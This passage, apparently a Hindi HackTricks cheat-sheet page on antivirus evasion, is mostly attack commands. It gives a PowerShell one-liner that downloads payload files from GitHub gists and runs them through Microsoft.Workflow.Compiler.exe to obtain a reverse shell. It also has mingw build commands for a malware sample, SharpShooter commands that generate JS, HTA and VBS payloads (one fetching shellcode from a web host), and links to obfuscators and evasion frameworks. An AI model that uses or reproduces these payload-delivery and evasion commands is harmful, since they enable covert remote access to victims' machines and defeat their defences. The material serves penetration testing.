[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)

### C# कंपाइलर का उपयोग
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# अस्पष्टीकरण सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)

Merlin, Empire, Puppy, SalsaTools [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)

[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)

https://github.com/l0ss/Grouper2

{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}

{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}

### अन्य उपकरण
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### अधिक

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह!
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें**.

</details>
